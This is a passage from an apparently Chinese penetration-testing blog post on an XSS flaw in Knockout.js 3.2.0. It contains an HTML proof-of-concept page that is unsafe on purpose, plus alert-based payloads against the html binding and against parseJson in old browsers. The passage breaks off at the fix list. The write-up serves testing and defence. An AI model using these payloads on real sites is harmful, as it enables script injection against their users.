42.553863s-42.553863-17.021545-42.553864-42.553863v-72.341568c-127.66159 21.276932-182.981613-51.064636-221.28009-97.873886-17.021545-21.276932-29.787704-38.298477-46.80925-42.553864-21.276932-4.255386-38.298477-29.787704-29.787704-51.064636 4.255386-21.276932 29.787704-38.298477 51.064636-29.787704 42.553863 12.766159 68.086182 42.553863 93.6185 72.341568 34.043091 46.80925 63.830795 80.852341 153.193908 63.830795v-4.255386c0-25.532318 4.255386-55.320023 12.766159-76.596955-119.150818-25.532318-246.812408-102.129272-246.812408-327.664748 0-63.830795 21.276932-123.406204 59.575409-170.215454-17.021545-59.575409-12.766159-114.895431 12.766159-170.215454 4.255386-12.766159 12.766159-21.276932 25.532318-25.532318 17.021545-4.255386 72.341568-12.766159 187.236999 59.575409 93.6185-21.276932 191.492386-21.276932 280.855499 0 110.640045-72.341568 170.215454-63.830795 187.236999-59.575409 12.766159 4.255386 21.276932 12.766159 25.532319 25.532318 21.276932 55.320023 25.532318 110.640045 12.766159 165.960067 38.298477 46.80925 59.575409 106.384659 59.575408 170.215454 0 242.557022-144.683136 306.387817-246.812408 331.920135 8.510773 25.532318 12.766159 55.320023 12.766159 80.852341V938.892273c0 25.532318-17.021545 42.553863-42.553863 42.553864z" p-id="9491" fill="#d4237a"></path></svg>
                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>主页 | Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E-about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>关于 | About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>归档 | Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>搜索 | Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E9%93%BE%E6%8E%A5-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>链接 | Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ul>
    <li><a href="#漏洞url">漏洞URL</a></li>
    <li><a href="#风险详情">风险详情</a></li>
    <li><a href="#漏洞证明">漏洞证明</a></li>
    <li><a href="#漏洞修复">漏洞修复</a></li>
  </ul>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/knockout.js3.2.0%E7%89%88%E6%9C%AC%E8%BF%87%E4%BD%8E%E5%AF%BC%E8%87%B4xss%E6%BC%8F%E6%B4%9E%E4%B8%AD%E5%8D%B1/">
                
                    <img src="/images/55.webp" loading="lazy" alt="Featured image of post 【Knockout.js】3.2.0版本过低导致XSS漏洞（中危）" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="background-color: #1d3557; color: #f1faee;">
                渗透测试
            </a>
        
		
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/knockout.js3.2.0%E7%89%88%E6%9C%AC%E8%BF%87%E4%BD%8E%E5%AF%BC%E8%87%B4xss%E6%BC%8F%E6%B4%9E%E4%B8%AD%E5%8D%B1/">【Knockout.js】3.2.0版本过低导致XSS漏洞（中危）</a>
        </h2>
    
        
    </div>

    
    
    
	
    
	
    <footer class="article-time">
        
            <div>
                <time class="article-time--published">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>2025年09月09日</time>
                <span class="article-word-count">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 2H6a2 2 0 0 0 -2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2V8z" /><polyline points="14 2 14 8 20 8" /><line x1="16" y1="13" x2="8" y2="13" /><line x1="16" y1="17" x2="8" y2="17" /><polyline points="10 9 9 9 8 9" /></svg>
                    文章共2240字
                </span>
            </div>
			
        

        
    </footer>
    

    
	
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="漏洞url">漏洞URL</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://xxxx/xx/xxx/knockout/knockout-3.2.0.debug.js
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="风险详情">风险详情</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">攻击者利用脚本注入提供了“合法入口”（组件渲染逻辑未过滤</span> <span class="n">HTML</span> <span class="err">代码）。攻击门槛低，无需复杂技术，现成</span> <span class="n">payload</span> <span class="err">可直接利用。</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="漏洞证明">漏洞证明</h1>
<h2 id="文件下载">文件下载</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">通过网盘分享的文件：knockout_xss_test.7z
</span></span><span class="line"><span class="cl">链接: https://pan.baidu.com/s/1g9cCWf1ryzcP4F3n6qDAnQ 提取码: wtxx 
</span></span><span class="line"><span class="cl">--来自百度网盘超级会员v4的分享
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="poc">POC</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">&#34;zh-CN&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="n">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">Knockout</span><span class="o">.</span><span class="n">js</span> <span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span> <span class="n">XSS漏洞测试</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">style</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="n">body</span> <span class="p">{</span> <span class="n">font</span><span class="o">-</span><span class="n">family</span><span class="p">:</span> <span class="n">Arial</span><span class="p">,</span> <span class="n">sans</span><span class="o">-</span><span class="n">serif</span><span class="p">;</span> <span class="n">margin</span><span class="p">:</span> <span class="mi">20</span><span class="n">px</span><span class="p">;</span> <span class="n">line</span><span class="o">-</span><span class="n">height</span><span class="p">:</span> <span class="mf">1.6</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">.</span><span class="n">test</span><span class="o">-</span><span class="k">case</span> <span class="p">{</span> <span class="n">margin</span><span class="o">-</span><span class="n">bottom</span><span class="p">:</span> <span class="mi">30</span><span class="n">px</span><span class="p">;</span> <span class="n">padding</span><span class="p">:</span> <span class="mi">20</span><span class="n">px</span><span class="p">;</span> <span class="n">border</span><span class="p">:</span> <span class="mi">1</span><span class="n">px</span> <span class="n">solid</span> <span class="c1">#ddd; border-radius: 5px; background-color: #f9f9f9; }</span>
</span></span><span class="line"><span class="cl">        <span class="n">h2</span> <span class="p">{</span> <span class="n">color</span><span class="p">:</span> <span class="c1">#333; border-bottom: 2px solid #333; padding-bottom: 5px; }</span>
</span></span><span class="line"><span class="cl">        <span class="n">input</span><span class="p">[</span><span class="n">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span><span class="p">]</span> <span class="p">{</span> <span class="n">width</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span><span class="p">;</span> <span class="n">padding</span><span class="p">:</span> <span class="mi">8</span><span class="n">px</span><span class="p">;</span> <span class="n">margin</span><span class="p">:</span> <span class="mi">10</span><span class="n">px</span> <span class="mi">0</span><span class="p">;</span> <span class="n">box</span><span class="o">-</span><span class="n">sizing</span><span class="p">:</span> <span class="n">border</span><span class="o">-</span><span class="n">box</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">button</span> <span class="p">{</span> <span class="n">padding</span><span class="p">:</span> <span class="mi">10</span><span class="n">px</span> <span class="mi">15</span><span class="n">px</span><span class="p">;</span> <span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span> <span class="c1">#4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; }</span>
</span></span><span class="line"><span class="cl">        <span class="n">button</span><span class="p">:</span><span class="n">hover</span> <span class="p">{</span> <span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span> <span class="c1">#45a049; }</span>
</span></span><span class="line"><span class="cl">        <span class="o">.</span><span class="n">result</span> <span class="p">{</span> <span class="n">margin</span><span class="o">-</span><span class="n">top</span><span class="p">:</span> <span class="mi">15</span><span class="n">px</span><span class="p">;</span> <span class="n">padding</span><span class="p">:</span> <span class="mi">10</span><span class="n">px</span><span class="p">;</span> <span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span> <span class="c1">#e8e8e8; border-radius: 4px; }</span>
</span></span><span class="line"><span class="cl">        <span class="o">.</span><span class="n">warning</span> <span class="p">{</span> <span class="n">color</span><span class="p">:</span> <span class="c1">#ff4444; font-weight: bold; }</span>
</span></span><span class="line"><span class="cl">        <span class="n">pre</span> <span class="p">{</span> <span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span> <span class="c1">#f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; }</span>
</span></span><span class="line"><span class="cl">        <span class="o">.</span><span class="n">security</span><span class="o">-</span><span class="n">tips</span> <span class="p">{</span> <span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span> <span class="c1">#fff3cd; padding: 15px; border: 1px solid #ffeaa7; border-radius: 5px; margin-top: 20px; }</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;!--</span> <span class="err">引入</span><span class="n">Knockout</span><span class="o">.</span><span class="n">js</span> <span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span> <span class="o">--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">script</span> <span class="n">src</span><span class="o">=</span><span class="s2">&#34;knockout-3.2.0.debug.js&#34;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Knockout</span><span class="o">.</span><span class="n">js</span> <span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span> <span class="n">XSS漏洞测试</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="o">&lt;!--</span> <span class="err">测试用例</span><span class="mi">1</span><span class="p">:</span> <span class="n">HTML绑定XSS漏洞</span> <span class="o">--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">div</span> <span class="k">class</span><span class="o">=</span><span class="s2">&#34;test-case&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">h2</span><span class="o">&gt;</span><span class="err">测试用例</span><span class="mi">1</span><span class="p">:</span> <span class="n">HTML绑定XSS漏洞</span><span class="o">&lt;/</span><span class="n">h2</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">Knockout</span><span class="o">.</span><span class="n">js的html绑定直接将内容渲染为HTML</span><span class="err">，没有进行任何转义，这是一个明显的</span><span class="n">XSS漏洞</span><span class="err">。</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">p</span> <span class="k">class</span><span class="o">=</span><span class="s2">&#34;warning&#34;</span><span class="o">&gt;</span><span class="err">⚠️</span> <span class="err">注意：请不要在生产环境中使用此绑定处理来自不可信源的数据！</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">label</span> <span class="k">for</span><span class="o">=</span><span class="s2">&#34;htmlInput&#34;</span><span class="o">&gt;</span><span class="err">输入可能包含</span><span class="n">XSS的内容</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">label</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="n">id</span><span class="o">=</span><span class="s2">&#34;htmlInput&#34;</span> <span class="n">data</span><span class="o">-</span><span class="n">bind</span><span class="o">=</span><span class="s2">&#34;value: htmlContent&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">button</span> <span class="n">data</span><span class="o">-</span><span class="n">bind</span><span class="o">=</span><span class="s2">&#34;click: updateHtml&#34;</span><span class="o">&gt;</span><span class="err">更新内容</span><span class="o">&lt;/</span><span class="n">button</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">div</span> <span class="k">class</span><span class="o">=</span><span class="s2">&#34;result&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="err">渲染结果</span> <span class="p">(</span><span class="err">使用</span><span class="n">html绑定</span><span class="p">):</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">div</span> <span class="n">data</span><span class="o">-</span><span class="n">bind</span><span class="o">=</span><span class="s2">&#34;html: htmlContent&#34;</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">div</span> <span class="k">class</span><span class="o">=</span><span class="s2">&#34;result&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="err">安全渲染结果</span> <span class="p">(</span><span class="err">使用</span><span class="n">text绑定</span><span class="p">):</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">div</span> <span class="n">data</span><span class="o">-</span><span class="n">bind</span><span class="o">=</span><span class="s2">&#34;text: htmlContent&#34;</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;</span><span class="err">示例</span><span class="n">Payload</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="n">x</span> <span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="s1">&#39;XSS via html binding&#39;</span><span class="p">)</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="o">&lt;!--</span> <span class="err">测试用例</span><span class="mi">2</span><span class="p">:</span> <span class="n">parseJson函数XSS漏洞</span> <span class="o">--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">div</span> <span class="k">class</span><span class="o">=</span><span class="s2">&#34;test-case&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">h2</span><span class="o">&gt;</span><span class="err">测试用例</span><span class="mi">2</span><span class="p">:</span> <span class="n">parseJson函数XSS漏洞</span><span class="o">&lt;/</span><span class="n">h2</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="err">在不支持</span><span class="n">JSON</span><span class="o">.</span><span class="n">parse的旧浏览器中</span><span class="err">，</span><span class="n">ko</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">parseJson使用new</span> <span class="n">Function</span><span class="p">()</span><span class="err">来解析</span><span class="n">JSON</span><span class="err">，这允许执行任意</span><span class="n">JavaScript代码</span><span class="err">。</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">p</span> <span class="k">class</span><span class="o">=</span><span class="s2">&#34;warning&#34;</span><span class="o">&gt;</span><span class="err">⚠️</span> <span class="err">注意：这个漏洞在现代浏览器中不适用，但在</span><span class="n">IE8等旧浏览器中存在风险</span><span class="err">！</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">label</span> <span class="k">for</span><span class="o">=</span><span class="s2">&#34;jsonInput&#34;</span><span class="o">&gt;</span><span class="err">输入恶意</span><span class="n">JSON</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">label</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="n">id</span><span class="o">=</span><span class="s2">&#34;jsonInput&#34;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">x</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">y</span><span class="se">\&#34;</span><span class="s2">}&#34;</span> <span class="n">data</span><span class="o">-</span><span class="n">bind</span><span class="o">=</span><span class="s2">&#34;value: jsonContent&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">button</span> <span class="n">data</span><span class="o">-</span><span class="n">bind</span><span class="o">=</span><span class="s2">&#34;click: parseJson&#34;</span><span class="o">&gt;</span><span class="err">解析</span><span class="n">JSON</span><span class="o">&lt;/</span><span class="n">button</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">div</span> <span class="k">class</span><span class="o">=</span><span class="s2">&#34;result&#34;</span> <span class="n">data</span><span class="o">-</span><span class="n">bind</span><span class="o">=</span><span class="s2">&#34;text: jsonParseResult&#34;</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;</span><span class="err">示例</span><span class="n">Payload</span> <span class="p">(</span><span class="err">仅在旧浏览器中有效</span><span class="p">):</span> <span class="p">{</span><span class="s2">&#34;x&#34;</span><span class="p">:</span><span class="n">alert</span><span class="p">(</span><span class="s1">&#39;XSS via parseJson&#39;</span><span class="p">)}</span><span class="o">&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="o">&lt;!--</span> <span class="err">安全修复建议</span> <span class="o">--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">div</span> <span class="k">class</span><span class="o">=</span><span class="s2">&#34;security-tips&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">h2</span><span class="o">&gt;</span><span class="err">安全修复建议</span><span class="o">&lt;/</span><span class="n">h2</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">ul</span><span class="o">&gt;</span>
